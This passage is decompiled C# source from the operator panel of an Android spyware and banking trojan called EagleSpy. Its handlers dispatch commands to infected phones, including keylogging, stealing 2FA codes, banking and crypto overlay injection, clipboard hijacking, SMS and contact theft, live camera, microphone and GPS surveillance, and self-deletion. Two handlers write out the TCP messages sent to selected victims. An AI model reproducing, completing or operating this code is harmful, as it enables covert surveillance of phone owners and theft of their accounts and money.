			this.SCREENREADERV2();
		}

		// Token: 0x0600055A RID: 1370 RVA: 0x00003956 File Offset: 0x00001B56
		private void drakeUIButtonIcon47_Click(object sender, EventArgs e)
		{
			this.CALLSMANAGER();
		}

		// Token: 0x0600055B RID: 1371 RVA: 0x0000395E File Offset: 0x00001B5E
		private void drakeUIButtonIcon64_Click(object sender, EventArgs e)
		{
			this.LOCKSCREEN();
		}

		// Token: 0x0600055C RID: 1372 RVA: 0x00003966 File Offset: 0x00001B66
		private void drakeUIButtonIcon46_Click(object sender, EventArgs e)
		{
			this.MICROPHONEACCESS();
		}

		// Token: 0x0600055D RID: 1373 RVA: 0x0000396E File Offset: 0x00001B6E
		private void drakeUIButtonIcon42_Click(object sender, EventArgs e)
		{
			this.CONTACTSLIST();
		}

		// Token: 0x0600055E RID: 1374 RVA: 0x00003976 File Offset: 0x00001B76
		private void drakeUIButtonIcon48_Click(object sender, EventArgs e)
		{
			this.CLIPBOARD();
		}

		// Token: 0x0600055F RID: 1375 RVA: 0x0000397E File Offset: 0x00001B7E
		private void drakeUIButtonIcon63_Click(object sender, EventArgs e)
		{
			this.AUTOUNLOCKSCREEN();
		}

		// Token: 0x06000560 RID: 1376 RVA: 0x00003986 File Offset: 0x00001B86
		private void drakeUIButtonIcon50_Click(object sender, EventArgs e)
		{
			this.KEYLOGGER();
		}

		// Token: 0x06000561 RID: 1377 RVA: 0x0000398E File Offset: 0x00001B8E
		private void drakeUIButtonIcon44_Click(object sender, EventArgs e)
		{
			this.GPS();
		}

		// Token: 0x06000562 RID: 1378 RVA: 0x00003996 File Offset: 0x00001B96
		private void drakeUIButtonIcon49_Click(object sender, EventArgs e)
		{
			this.SCREENREADERV1();
		}

		// Token: 0x06000563 RID: 1379 RVA: 0x0000399E File Offset: 0x00001B9E
		private void drakeUIButtonIcon83_Click(object sender, EventArgs e)
		{
			this.CLICKTOUNLOCK();
		}

		// Token: 0x06000564 RID: 1380 RVA: 0x000039A6 File Offset: 0x00001BA6
		private void drakeUIButtonIcon69_Click(object sender, EventArgs e)
		{
			this.AUTHSTEALER();
		}

		// Token: 0x06000565 RID: 1381 RVA: 0x000039AE File Offset: 0x00001BAE
		private void drakeUIButtonIcon71_Click(object sender, EventArgs e)
		{
			this.ACCOUNTS();
		}

		// Token: 0x06000566 RID: 1382 RVA: 0x000039B6 File Offset: 0x00001BB6
		private void drakeUIButtonIcon68_Click(object sender, EventArgs e)
		{
			this.OPENURL();
		}

		// Token: 0x06000567 RID: 1383 RVA: 0x000039BE File Offset: 0x00001BBE
		private void drakeUIButtonIcon70_Click(object sender, EventArgs e)
		{
			this.TOASTMESSAGE();
		}

		// Token: 0x06000568 RID: 1384 RVA: 0x000039C6 File Offset: 0x00001BC6
		private void drakeUIButtonIcon75_Click(object sender, EventArgs e)
		{
			this.SELFDELETE();
		}

		// Token: 0x06000569 RID: 1385 RVA: 0x000039CE File Offset: 0x00001BCE
		private void drakeUIButtonIcon76_Click(object sender, EventArgs e)
		{
			this.PERMISSIONMANAGER();
		}

		// Token: 0x0600056A RID: 1386 RVA: 0x000039D6 File Offset: 0x00001BD6
		private void drakeUIButtonIcon77_Click(object sender, EventArgs e)
		{
			this.REQUESTADMINRIGHT();
		}

		// Token: 0x0600056B RID: 1387 RVA: 0x000039DE File Offset: 0x00001BDE
		private void drakeUIButtonIcon56_Click(object sender, EventArgs e)
		{
			this.DIALNUMBER();
		}

		// Token: 0x0600056C RID: 1388 RVA: 0x000039E6 File Offset: 0x00001BE6
		private void drakeUIButtonIcon82_Click(object sender, EventArgs e)
		{
			this.BANKINGINJECTION();
		}

		// Token: 0x0600056D RID: 1389 RVA: 0x00003916 File Offset: 0x00001B16
		private void drakeUIButtonIcon74_Click(object sender, EventArgs e)
		{
			this.CRYPTOINJECTION();
		}

		// Token: 0x0600056E RID: 1390 RVA: 0x000039EE File Offset: 0x00001BEE
		private void drakeUIButtonIcon61_Click(object sender, EventArgs e)
		{
			this.NOTIFICATIONMANAGER();
		}

		// Token: 0x0600056F RID: 1391 RVA: 0x00088674 File Offset: 0x00086874
		private void drakeUIButtonIcon78_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string[] array = client.Keys.Split(new char[] { ':' });
								TcpClient myClient = client.myClient;
								object[] array2 = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"CRD<*>E>com.google.android.gms",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array2);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000570 RID: 1392 RVA: 0x00088840 File Offset: 0x00086A40
		private void guna2Button1_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count <= 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string[] array = client.Keys.Split(new char[] { ':' });
								TcpClient myClient = client.myClient;
								object[] array2 = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"SFD<*>com.google.android.gms",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(array2);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000571 RID: 1393 RVA: 0x0000391E File Offset: 0x00001B1E
		private void LiveScreenControlToolsTrip_Click_1(object sender, EventArgs e)
		{
			this.LIVESCREEN();
		}

		// Token: 0x06000572 RID: 1394 RVA: 0x00003926 File Offset: 0x00001B26
		private void LiveCameraStreamToolsTrip_Click(object sender, EventArgs e)
		{
			this.CAMERAMANAGER();
		}

		// Token: 0x06000573 RID: 1395 RVA: 0x00003966 File Offset: 0x00001B66
		private void LiveMicrophoneToolsTrip_Click(object sender, EventArgs e)
		{
			this.MICROPHONEACCESS();
		}

		// Token: 0x06000574 RID: 1396 RVA: 0x00003986 File Offset: 0x00001B86
		private void KeyloggerToolsTrip_Click(object sender, EventArgs e)
		{
			this.KEYLOGGER();
		}

		// Token: 0x06000575 RID: 1397 RVA: 0x00003996 File Offset: 0x00001B96
		private void ScreenLoggerToolsTrip_Click(object sender, EventArgs e)
		{
			this.SCREENREADERV1();
		}

		// Token: 0x06000576 RID: 1398 RVA: 0x0000394E File Offset: 0x00001B4E
		private void ScreenReaderToolsTrip_Click(object sender, EventArgs e)
		{
			this.SCREENREADERV2();
		}

		// Token: 0x06000577 RID: 1399 RVA: 0x0000398E File Offset: 0x00001B8E
		private void LiveLocationToolsTrip_Click(object sender, EventArgs e)
		{
			this.GPS();
		}

		// Token: 0x06000578 RID: 1400 RVA: 0x00003936 File Offset: 0x00001B36
		private void FileManagerToolsTrip_Click(object sender, EventArgs e)
		{
			this.FILESMANAGER();
		}

		// Token: 0x06000579 RID: 1401 RVA: 0x00003956 File Offset: 0x00001B56
		private void CallsHistoryToolsTrip_Click(object sender, EventArgs e)
		{
			this.CALLSMANAGER();
		}

		// Token: 0x0600057A RID: 1402 RVA: 0x000039E6 File Offset: 0x00001BE6
		private void bankinginjectionToolsTrip_Click(object sender, EventArgs e)
		{
			this.BANKINGINJECTION();
		}

		// Token: 0x0600057B RID: 1403 RVA: 0x000039DE File Offset: 0x00001BDE
		private void toolStripMenuItem28_Click(object sender, EventArgs e)
		{
			this.DIALNUMBER();
		}

		// Token: 0x0600057C RID: 1404 RVA: 0x0000392E File Offset: 0x00001B2E
		private void ReadSmssToolsTrip_Click(object sender, EventArgs e)
		{
			this.SMSMANAGER();
		}

		// Token: 0x0600057D RID: 1405 RVA: 0x0000396E File Offset: 0x00001B6E
		private void ContactsListToolsTrip_Click(object sender, EventArgs e)
		{
			this.CONTACTSLIST();
		}

		// Token: 0x0600057E RID: 1406 RVA: 0x00003976 File Offset: 0x00001B76
		private void CryptoClipperToolsTrip_Click(object sender, EventArgs e)
		{
			this.CLIPBOARD();
		}

		// Token: 0x0600057F RID: 1407 RVA: 0x000039A6 File Offset: 0x00001BA6
		private void Steal2FaCodeToolsTrip_Click(object sender, EventArgs e)
		{
			this.AUTHSTEALER();
		}

		// Token: 0x06000580 RID: 1408 RVA: 0x000039F6 File Offset: 0x00001BF6
		private void toolStripMenuItem29_Click(object sender, EventArgs e)
		{
			this.COMMANDTERMINAL();
		}

		// Token: 0x06000581 RID: 1409 RVA: 0x0000393E File Offset: 0x00001B3E
		private void InstalledApplicationsToolsTrip_Click(object sender, EventArgs e)
		{
			this.INSTALLEDAPPS();
		}

		// Token: 0x06000582 RID: 1410 RVA: 0x0000395E File Offset: 0x00001B5E
		private void toolStripMenuItem30_Click(object sender, EventArgs e)
		{
			this.LOCKSCREEN();
		}

		// Token: 0x06000583 RID: 1411 RVA: 0x0000399E File Offset: 0x00001B9E
		private void toolStripMenuItem31_Click(object sender, EventArgs e)
		{
			this.CLICKTOUNLOCK();
		}

		// Token: 0x06000584 RID: 1412 RVA: 0x000039BE File Offset: 0x00001BBE
		private void toolStripMenuItem32_Click(object sender, EventArgs e)
		{
			this.TOASTMESSAGE();
		}

		// Token: 0x06000585 RID: 1413 RVA: 0x000039D6 File Offset: 0x00001BD6
		private void toolStripMenuItem26_Click(object sender, EventArgs e)
		{
			this.REQUESTADMINRIGHT();
		}

		// Token: 0x06000586 RID: 1414 RVA: 0x000039CE File Offset: 0x00001BCE
		private void toolStripMenuItem27_Click(object sender, EventArgs e)
		{
			this.PERMISSIONMANAGER();
		}

		// Token: 0x06000587 RID: 1415 RVA: 0x000039FE File Offset: 0x00001BFE
		private void NotificationsReaderToolsTrip_Click(object sender, EventArgs e)
		{
			this.NOTIFICATIONLISTENER();
		}

		// Token: 0x06000588 RID: 1416 RVA: 0x000039AE File Offset: 0x00001BAE
		private void ShowRegisteredEmailsToolsTrip_Click(object sender, EventArgs e)
		{
			this.ACCOUNTS();
		}

		// Token: 0x06000589 RID: 1417 RVA: 0x000039B6 File Offset: 0x00001BB6
		private void OpenLinkToolsTrip_Click(object sender, EventArgs e)
		{
			this.OPENURL();
		}

		// Token: 0x0600058A RID: 1418 RVA: 0x000039C6 File Offset: 0x00001BC6
		private void SelfDestructVirusToolsTrip_Click(object sender, EventArgs e)
		{
			this.SELFDELETE();
		}

		// Token: 0x0600058B RID: 1419 RVA: 0x00003A06 File Offset: 0x00001C06
		private void RestartToolsTrip_Click(object sender, EventArgs e)
		{
			this.RESTARTCONNECTION();
		}

		// Token: 0x0600058C RID: 1420 RVA: 0x00003A0E File Offset: 0x00001C0E
		private void KillAppsToolsTrip_Click(object sender, EventArgs e)
		{
			this.ALLOWTODELETE();
		}

		// Token: 0x0600058D RID: 1421 RVA: 0x00003A16 File Offset: 0x00001C16
		private void ClienttFolderToolsTrip_Click(object sender, EventArgs e)
		{
			this.CLIENTSFOLDER();
		}

		// Token: 0x0600058E RID: 1422 RVA: 0x00002423 File Offset: 0x00000623
		private void timer1_Tick(object sender, EventArgs e)
		{
		}

		// Token: 0x0600058F RID: 1423 RVA: 0x00088A0C File Offset: 0x00086C0C
		private void drakeUIAvatar15_Click(object sender, EventArgs e)
		{
			LangSelect langSelect = new LangSelect();
			langSelect.Show();
		}

		// Token: 0x06000590 RID: 1424 RVA: 0x00003A1E File Offset: 0x00001C1E
		private void drakeUIAvatar16_Click(object sender, EventArgs e)
		{
			this.UpdateLanguage();
		}

		// Token: 0x04000406 RID: 1030
		private PerformanceCounter cpuCounter;

		// Token: 0x04000407 RID: 1031
		private readonly HttpListener httpListener;

		// Token: 0x04000408 RID: 1032
		private readonly string rootDirectory;

		// Token: 0x04000409 RID: 1033
		public string PORTs;

		// Token: 0x0400040A RID: 1034
		public List<Accept> server;

		// Token: 0x0400040B RID: 1035
		private string Myname;

		// Token: 0x0400040C RID: 1036
		public bool Alive;

		// Token: 0x0400040D RID: 1037
		public static bool ISDB = true;

		// Token: 0x0400040E RID: 1038
		public static int MyStatus = 1;

		// Token: 0x0400040F RID: 1039
		private int Mx;

		// Token: 0x04000410 RID: 1040
		private int Min;

		// Token: 0x04000411 RID: 1041
		private int Sw;

		// Token: 0x04000412 RID: 1042
		private int Sh;

		// Token: 0x04000413 RID: 1043
		private bool mov;

		// Token: 0x04000414 RID: 1044
		public string DKF;

		// Token: 0x04000415 RID: 1045
		public string DKD;

		// Token: 0x04000416 RID: 1046
		public Ports PortsManager;

		// Token: 0x04000417 RID: 1047
		public GeoMap GlobalMap;

		// Token: 0x04000418 RID: 1048
		public Dictionary<string, double> Globalvlues;

		// Token: 0x04000419 RID: 1049
		public global::System.Threading.Timer _timer;

		// Token: 0x0400041A RID: 1050
		public Build B;

		// Token: 0x0400041B RID: 1051
		public BackgroundWorker[] Workers;

		// Token: 0x0400041C RID: 1052
		private object NumWorkers;

		// Token: 0x0400041D RID: 1053
		public clsComputerInfo SCANER;

		// Token: 0x0400041E RID: 1054
		public Win_Users WU;

		// Token: 0x0400041F RID: 1055
		private string temptext;

		// Token: 0x04000420 RID: 1056
		private string temptext2;

		// Token: 0x04000421 RID: 1057
		public Jector JC;

		// Token: 0x04000422 RID: 1058
		public bool isactive;

		// Token: 0x04000423 RID: 1059
		private List<DataGridViewRow> searchbefore;

		// Token: 0x04000424 RID: 1060
		public Random ran;

		// Token: 0x04000425 RID: 1061
		public Apk_studio ST;

		// Token: 0x04000426 RID: 1062
		public Drooper DR;

		// Token: 0x040005D3 RID: 1491
		private SoundPlayer soundPlayer;

		// Token: 0x02000049 RID: 73
		// (Invoke) Token: 0x06000593 RID: 1427
		public delegate void addLogback(object[] objs);

		// Token: 0x0200004A RID: 74
		// (Invoke) Token: 0x06000597 RID: 1431
		public delegate void deleNotifidgv(object[] objs);

		// Token: 0x0200004B RID: 75
		// (Invoke) Token: 0x0600059B RID: 1435
		public delegate void delecallsidgv(object[] objs);

		// Token: 0x0200004C RID: 76
		// (Invoke) Token: 0x0600059F RID: 1439
		public delegate void delealertsidgv(object[] objs);

		// Token: 0x0200004D RID: 77
		// (Invoke) Token: 0x060005A3 RID: 1443
		public delegate void deleaddnewrow(object[] obj);

		// Token: 0x0200004E RID: 78
		// (Invoke) Token: 0x060005A7 RID: 1447
		public delegate void updateuiD(object[] objs);

		// Token: 0x02000051 RID: 81
		[CompilerGenerated]
		internal sealed class _Closure_0024__171_002D0
		{
			// Token: 0x060005B2 RID: 1458 RVA: 0x00003A44 File Offset: 0x00001C44
			public _Closure_0024__171_002D0(EagleSpyMain._Closure_0024__171_002D0 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_keyValues = arg0._0024VB_0024Local_keyValues;
				}
			}

			// Token: 0x060005B3 RID: 1459 RVA: 0x00003A5B File Offset: 0x00001C5B
			internal void _Lambda_0024__0()
			{
				Data.MainForm.GlobalMap.HeatMap = this._0024VB_0024Local_keyValues;
				((Control)Data.MainForm.GlobalMap).Update();
			}

			// Token: 0x0400060C RID: 1548
			public Dictionary<string, double> _0024VB_0024Local_keyValues;
		}

		// Token: 0x02000052 RID: 82
		[CompilerGenerated]
		internal sealed class _Closure_0024__210_002D0
		{
			// Token: 0x060005B4 RID: 1460 RVA: 0x00003A86 File Offset: 0x00001C86
			public _Closure_0024__210_002D0(EagleSpyMain._Closure_0024__210_002D0 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_portnumber = arg0._0024VB_0024Local_portnumber;
				}
			}

			// Token: 0x060005B5 RID: 1461 RVA: 0x00003A9D File Offset: 0x00001C9D
			internal void _Lambda_0024__0()
			{
				this._0024VB_0024Me.server.Add(new Accept(this._0024VB_0024Local_portnumber));
			}

			// Token: 0x0400060D RID: 1549
			public string _0024VB_0024Local_portnumber;

			// Token: 0x0400060E RID: 1550
			public EagleSpyMain _0024VB_0024Me;
		}

		// Token: 0x02000053 RID: 83
		[CompilerGenerated]
		internal sealed class _Closure_0024__56_002D0
		{
			// Token: 0x060005B6 RID: 1462 RVA: 0x00003ABA File Offset: 0x00001CBA
			public _Closure_0024__56_002D0(EagleSpyMain._Closure_0024__56_002D0 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_row = arg0._0024VB_0024Local_row;
					this._0024VB_0024Local_uuid = arg0._0024VB_0024Local_uuid;
				}
			}

			// Token: 0x060005B7 RID: 1463 RVA: 0x00003ADD File Offset: 0x00001CDD
			internal void _Lambda_0024__0()
			{
				this._0024VB_0024Me.RemoveCard(this._0024VB_0024Local_row, this._0024VB_0024Local_uuid);
			}

			// Token: 0x0400060F RID: 1551
			public DataGridViewRow _0024VB_0024Local_row;

			// Token: 0x04000610 RID: 1552
			public string _0024VB_0024Local_uuid;

			// Token: 0x04000611 RID: 1553
			public EagleSpyMain _0024VB_0024Me;
		}

        private void label8_Click(object sender, EventArgs e)
        {

        }
    }
}
